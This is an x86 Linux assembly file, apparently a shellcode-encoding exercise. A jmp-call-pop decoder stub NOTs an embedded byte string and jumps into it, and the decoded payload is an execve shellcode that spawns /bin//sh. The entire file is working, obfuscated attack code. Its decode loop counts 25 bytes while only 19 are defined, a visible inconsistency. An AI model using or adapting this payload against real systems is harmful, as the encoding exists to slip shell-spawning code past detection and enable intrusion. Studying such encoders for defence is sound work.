global _start

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx,ecx
	mov cl, 25

decode:
	not byte[esi]
	inc esi
	loop decode

	jmp short encoded_shellcode

call_shellcode:
	call decoder
	encoded_shellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x78,0x1c,0x4f,0xf4,0x32,0x7f
